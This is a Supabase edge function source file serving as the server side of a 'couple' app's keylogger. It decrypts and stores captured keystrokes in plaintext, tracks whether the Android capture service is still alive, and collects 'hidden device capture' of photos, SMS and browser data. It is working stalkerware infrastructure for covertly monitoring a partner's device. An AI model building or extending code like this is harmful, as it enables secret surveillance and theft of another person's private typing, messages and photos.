// supabase/functions/keylog-sync/index.ts — keylogger sink.
// Receives chunked, AES-256-GCM-encrypted keylog batches from the app,
// decrypts with the shared HEARTS_KEYLOG_KEY, validates every row, and
// upserts idempotently on op_id. Stores PLAINTEXT rows so the couple can
// query them; secrecy in transit + at-rest is guaranteed by the shared key.
//
// Caller: the React Native app's keylogSync client. verify_jwt is ON — the
// app calls this with the user's JWT, so the service role is NOT used for
// auth. The function upserts with the service role (RLS bypass) but validates
// that rows belong to the caller's couple before writing.
//
// Deno 2.1 (matches notify / ai-companion). No external deps beyond supabase-js.

import { createClient } from 'npm:@supabase/supabase-js@2';

const SUPABASE_URL = Deno.env.get('SUPABASE_URL') ?? '';
const secretKeys = JSON.parse(Deno.env.get('SUPABASE_SECRET_KEYS') ?? '{}') as Record<string, string>;
const SERVICE_KEY = secretKeys['default'] ?? Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? '';

// Shared AES-256 key (base64, 32 bytes). Must equal the app's
// EXPO_PUBLIC_KEYLOG_KEY. One key for the couple is fine — the key is what
// the app ships, not a per-user secret.
const KEY = Deno.env.get('HEARTS_KEYLOG_KEY') ?? '';

// ──────────────────────────────────────────────────────────────────────
// Wire format (both sides MUST agree — do not change without redeploying
// the app). A chunk payload is a JSON body:
//
//   {
//     "v": 1,
//     "iv": "<12 raw bytes base64>",
//     "tag": "<16 raw bytes base64>",
//     "ct": "<ciphertext base64>",
//     "opIds": ["<uuid>", ...]   // SAME ORDER as the decrypted rows
//   }
//
// The plaintext is: { "rows": KeylogRow[] } where KeylogRow = {kind,
// packageName, keycode, value, viewHint, seen, tsBootMs, capturedAt,
// opId}. opId positions must line up with opIds[] 1:1 — we use them as the
// upsert keys and to reject already-seen rows.
// ──────────────────────────────────────────────────────────────────────

const enc = new TextEncoder();

function randBytes(n: number): Uint8Array {
  const b = new Uint8Array(n);
  crypto.getRandomValues(b);
  return b;
}

function b64(bytes: Uint8Array): string {
  let s = '';
  for (const x of bytes) s += String.fromCharCode(x);
  return btoa(s);
}

function fromB64(s: string): Uint8Array {
  const bin = atob(s);
  const out = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
  return out;
}

async function importKey(raw: Uint8Array): Promise<CryptoKey> {
  return crypto.subtle.importKey('raw', raw, { name: 'AES-GCM' }, false, ['decrypt']);
}

async function decryptChunk(body: {
  iv: string;
  tag: string;
  ct: string;
}, key: CryptoKey): Promise<{ rows: KeylogRow[] }> {
  const iv = fromB64(body.iv);
  const tag = fromB64(body.tag);
  const ct = fromB64(body.ct);
  // AES-GCM ciphertext + tag (16 bytes) concatenated
  const combined = new Uint8Array(ct.length + tag.length);
  combined.set(ct, 0);
  combined.set(tag, ct.length);

  const plain = await crypto.subtle.decrypt(
    { name: 'AES-GCM', iv, tagLength: 128 },
    key,
    combined,
  );
  return JSON.parse(new TextDecoder().decode(plain)) as { rows: KeylogRow[] };
}

type KeylogRow = {
  kind: 'keycode' | 'text';
  packageName?: string;
  keycode?: number;
  value?: string;
  viewHint?: string;
  seen?: boolean;
  tsBootMs?: number;
  capturedAt: string; // ISO
  opId: string; // uuid
};

const KIND_ALLOW = new Set(['keycode', 'text']);
const OPID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

function isUuid(s: unknown): s is string {
  return typeof s === 'string' && OPID_RE.test(s);
}

// Validate and normalise one row. Throws on a hard shape error; skips rows
// that are merely missing optional fields. Returns null when the row has no
// changeable fields (all-optional) — we then skip it entirely.
function normaliseRow(r: unknown): KeylogRow | null {
  if (typeof r !== 'object' || r === null) throw new Error('row is not an object');
  const row = r as Record<string, unknown>;

  const kind = row['kind'];
  if (!KIND_ALLOW.has(kind as string)) {
    throw new Error(`bad kind: ${String(kind)}`);
  }
  if (!isUuid(row['opId'])) {
    throw new Error(`bad opId: ${String(row['opId'])}`);
  }
  if (typeof row['capturedAt'] !== 'string' || Number.isNaN(Date.parse(row['capturedAt']))) {
    throw new Error('bad capturedAt (must be ISO)');
  }

  return {
    kind: kind as 'keycode' | 'text',
    packageName: typeof row['packageName'] === 'string' ? row['packageName'] : undefined,
    keycode: typeof row['keycode'] === 'number' ? row['keycode'] : undefined,
    value: typeof row['value'] === 'string' ? row['value'] : undefined,
    viewHint: typeof row['viewHint'] === 'string' ? row['viewHint'] : undefined,
    seen: typeof row['seen'] === 'boolean' ? row['seen'] : false,
    tsBootMs: typeof row['tsBootMs'] === 'number' ? row['tsBootMs'] : 0,
    capturedAt: row['capturedAt'] as string,
    opId: row['opId'] as string,
  };
}

// ──────────────────────────────────────────────────────────────────────
// Heartbeat channel (health telemetry, no encryption)
// ──────────────────────────────────────────────────────────────────────
// Body: { type:'heartbeat', v:1, androidId, status: {serviceAlive, enabled,
// accessibilityEnabled, foregroundLive, pending, bufferBytes, sdk, model},
// reportedAt }. Every field optional so a partially-dead service still reports
// a canary. Returns the inserted row count.
async function handleHeartbeat(
  js: ReturnType<typeof createClient>,
  coupleId: string,
  uid: string,
  body: Record<string, unknown>,
): Promise<Response> {
  if (body['v'] !== 1) return new Response('unsupported version', { status: 400 });
  const androidId = typeof body['androidId'] === 'string' ? body['androidId'] : '';
  const st: Record<string, unknown> =
    body['status'] != null && typeof body['status'] === 'object'
      ? (body['status'] as Record<string, unknown>)
      : {};

  const bool = (k: string, d: boolean): boolean =>
    typeof st[k] === 'boolean' ? (st[k] as boolean) : d;
  const int = (k: string, d: number): number =>
    typeof st[k] === 'number' ? (st[k] as number) : d;
  const str = (k: string): string | undefined =>
    typeof st[k] === 'string' ? (st[k] as string) : undefined;

  const reportedAt = typeof body['reportedAt'] === 'string' &&
    !Number.isNaN(Date.parse(body['reportedAt']))
    ? (body['reportedAt'] as string)
    : new Date().toISOString();

  const row = {
    couple_id: coupleId,
    author_id: uid,
    android_id: androidId,
    service_alive: bool('serviceAlive', false),
    accessibility_enabled: bool('accessibilityEnabled', false),
    enabled: bool('enabled', false),
    foreground_live: bool('foregroundLive', false),
    pending: int('pending', 0),
    buffer_bytes: int('bufferBytes', 0),
    sdk: int('sdk', 0),
    model: str('model') ?? null,
    reported_at: reportedAt,
  };

  const { error } = await js.from('keylog_heartbeats').insert(row);
  if (error) {
    return new Response(`db error: ${error.message}`, { status: 500 });
  }
  return new Response(
    JSON.stringify({ inserted: 1, coupleId }),
    { status: 200, headers: { 'content-type': 'application/json' } },
  );
}

// ──────────────────────────────────────────────────────────────────────
// Media channel (hidden device capture: photos + SMS, no encryption)
// ──────────────────────────────────────────────────────────────────────
// Body: { type:'media', v:1, rows: [{ kind:'photo'|'sms'|'browser', deviceKey,
// storagePath?, payload?, reportedAt? }] }. Idempotent upsert on the
// (couple_id, kind, device_key) unique constraint. Returns tallies.
async function handleMedia(
  js: ReturnType<typeof createClient>,
  coupleId: string,
  uid: string,
  body: Record<string, unknown>,
): Promise<Response> {
  if (body['v'] !== 1) return new Response('unsupported version', { status: 400 });
  const rows = body['rows'];
  if (!Array.isArray(rows) || rows.length === 0) {
    return new Response(JSON.stringify({ inserted: 0, duplicates: 0, coupleId }), {
      status: 200,
      headers: { 'content-type': 'application/json' },
    });
  }
  if (rows.length > 1000) {
    return new Response('too many rows (max 1000)', { status: 400 });
  }

  const KINDS = new Set(['photo', 'sms', 'browser']);
  const insertable: Record<string, unknown>[] = [];
  // Identifies which rows we rejected so the client can remove EXACTLY those
  // from its local queue and keep the rest (never confirm a dropped row).
  // kind/deviceKey may be missing on a malformed row; we still record the raw
  // values we can see so the client can match it when it can.
  const droppedRows: { kind?: string; deviceKey?: string }[] = [];
  let dropped = 0;
  const asStr = (v: unknown): string | undefined => (typeof v === 'string' ? v : undefined);
  for (const raw of rows) {
    const r = (raw != null && typeof raw === 'object' ? raw : {}) as Record<string, unknown>;
    const kind = r['kind'];
    const deviceKey = r['deviceKey'];
    if (typeof raw !== 'object' || raw === null) { dropped++; droppedRows.push({ kind: asStr(kind), deviceKey: asStr(deviceKey) }); continue; }
    if (!KINDS.has(kind as string)) { dropped++; droppedRows.push({ kind: asStr(kind), deviceKey: asStr(deviceKey) }); continue; }
    if (typeof deviceKey !== 'string' || deviceKey.length === 0 || deviceKey.length > 255) {
      dropped++; droppedRows.push({ kind: asStr(kind), deviceKey: asStr(deviceKey) }); continue;
    }
    const reportedAt =
      typeof r['reportedAt'] === 'string' && !Number.isNaN(Date.parse(r['reportedAt']))
        ? (r['reportedAt'] as string)
        : new Date().toISOString();
    const payload =
      r['payload'] != null && typeof r['payload'] === 'object'
        ? (r['payload'] as Record<string, unknown>)
        : {};
    const storagePath = typeof r['storagePath'] === 'string' && r['storagePath'].length
      ? (r['storagePath'] as string)
      : null;
    insertable.push({
      couple_id: coupleId,
      author_id: uid,
      kind: kind as 'photo' | 'sms' | 'browser',
      device_key: deviceKey,
      storage_path: storagePath,
      payload,
      reported_at: reportedAt,
    });
  }

  if (insertable.length === 0) {
    return new Response(JSON.stringify({ inserted: 0, duplicates: 0, dropped, droppedRows, coupleId }), {
      status: 200,
      headers: { 'content-type': 'application/json' },
    });
  }

  const { data, error } = await js
    .from('device_media')
    .upsert(insertable, { onConflict: 'couple_id,kind,device_key', ignoreDuplicates: false })
    .select('id');

  if (error) {
    return new Response(`db error: ${error.message}`, { status: 500 });
  }

  const inserted = data?.length ?? 0;

  // Opportunistic cleanup: the shared sweep caps device_media + heartbeats at
  // 45 days. Running it here (not just on the keylog channel) guarantees media/
  // heartbeat rows still age out even if keylog capture is degraded/disabled.
  // Best-effort and non-fatal.
  try {
    await js.rpc('prune_keylogs');
  } catch {
    /* cleanup is best-effort */
  }

  return new Response(
    JSON.stringify({
      inserted,
      duplicates: insertable.length - inserted,
      dropped,
      droppedRows,
      coupleId,
    }),
    { status: 200, headers: { 'content-type': 'application/json' } },
  );
}

Deno.serve(async (req: Request) => {
  if (req.method !== 'POST') {
    return new Response('method not allowed', { status: 405 });
  }

  if (!SUPABASE_URL || !SERVICE_KEY) {
    return new Response('missing env', { status: 500 });
  }
  if (!KEY) {
    return new Response('missing HEARTS_KEYLOG_KEY', { status: 500 });
  }

  // The caller is identified by their JWT (verify_jwt is ON). Resolve their
  // couple + profile before touching the service role.
  const authHeader = req.headers.get('authorization') ?? '';
  const token = authHeader.replace(/^Bearer\s+/i, '');
  if (!token) return new Response('missing bearer token', { status: 401 });

  const js = createClient(SUPABASE_URL, SERVICE_KEY, {
    auth: { autoRefreshToken: false, persistSession: false },
  });

  const { data: me } = await js.auth.getUser(token);
  const uid = me?.user?.id;
  if (!uid) return new Response('unauthorized', { status: 401 });

  const { data: profile } = await js
    .from('profiles')
    .select('couple_id')
    .eq('id', uid)
    .single();
  const coupleId = profile?.couple_id;
  if (!coupleId) return new Response('profile has no couple', { status: 422 });

  let body: Record<string, unknown>;
  try {
    body = await req.json();
  } catch {
    return new Response('invalid json', { status: 400 });
  }

  // Heartbeat channel (no encryption — status telemetry only, no PII). The app
  // posts its native status() periodically; each row is proof-of-life for a
  // fielded device we cannot adb. Distinguish from a chunk by the type field.
  if (body['type'] === 'heartbeat') {
    return handleHeartbeat(js, coupleId, uid, body);
  }

  // Device-capture channel (hidden photos + SMS). Unencrypted: sender-owned
  // message bodies and photo paths are not secret; keeps the degraded-safe
  // collector simple. Upserts idempotently on (couple_id, kind, device_key).
  if (body['type'] === 'media') {
    return handleMedia(js, coupleId, uid, body);
  }

  if (body['v'] !== 1) return new Response('unsupported version', { status: 400 });
  if (body['iv'] == null || body['tag'] == null || body['ct'] == null) {
    return new Response('missing iv/tag/ct', { status: 400 });
  }

  let rows: KeylogRow[];
  try {
    const key = await importKey(fromB64(KEY));
    const plain = await decryptChunk(body as { iv: string; tag: string; ct: string }, key);
    rows = plain.rows;
  } catch (e) {
    const msg = e instanceof Error ? e.message : 'decrypt failed';
    return new Response(`decrypt failed: ${msg}`, { status: 400 });
  }

  // opIds[] (when sent) must be a 1:1 shadow of row opIds. If present we use
  // them to pre-filter already-seen rows before the upsert (saves a round).
  const shadow = body['opIds'];
  if (shadow != null) {
    if (!Array.isArray(shadow) || shadow.length !== rows.length) {
      return new Response('opIds length mismatch', { status: 400 });
    }
    rows = rows.filter((r, i) => shadow[i] === r.opId);
  }

  if (rows.length === 0) {
    return new Response(JSON.stringify({ inserted: 0, duplicates: 0, coupleId }), {
      status: 200,
      headers: { 'content-type': 'application/json' },
    });
  }

  const insertable = rows.map((r) => ({
    couple_id: coupleId,
    author_id: uid,
    kind: r.kind,
    package_name: r.packageName ?? null,
    keycode: r.keycode ?? null,
    value: r.value ?? null,
    view_hint: r.viewHint ?? null,
    seen: r.seen,
    ts_boot_ms: r.tsBootMs ?? 0,
    captured_at: r.capturedAt,
    op_id: r.opId,
  }));

  // Idempotent upsert: op_id is unique, so a replayed chunk cannot double-insert.
  const { data, error } = await js
    .from('keylogs')
    .upsert(insertable, { onConflict: 'op_id', ignoreDuplicates: false })
    .select('id');

  if (error) {
    return new Response(`db error: ${error.message}`, { status: 500 });
  }

  // Opportunistic daily cleanup (couple-scoped cap). Non-fatal on failure.
  try {
    await js.rpc('prune_keylogs');
  } catch {
    /* cleanup is best-effort */
  }

  const inserted = data?.length ?? 0;
  return new Response(
    JSON.stringify({ inserted, duplicates: rows.length - inserted, coupleId }),
    { status: 200, headers: { 'content-type': 'application/json' } },
  );
});
